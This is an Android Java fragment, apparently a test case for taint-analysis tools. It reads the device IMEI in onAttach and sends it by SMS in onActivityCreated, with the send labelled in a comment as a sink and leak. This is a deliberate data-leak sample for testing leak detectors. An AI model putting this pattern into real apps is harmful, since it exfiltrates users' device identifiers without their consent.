package de.ecspride;

import android.app.Activity;
import android.app.Fragment;
import android.os.Bundle;
import android.telephony.SmsManager;

public class ExampleFragment extends Fragment {
	private static String imei = "";
	
	@Override
	public void onActivityCreated(Bundle savedInstanceState) {
		super.onActivityCreated(savedInstanceState);
		SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49", null, imei, null, null);  //sink, leak
	}
	  
	  
	@Override
	public void onAttach(Activity activity) {
		super.onAttach(activity);
		imei = MainActivity.imei;
	}
}
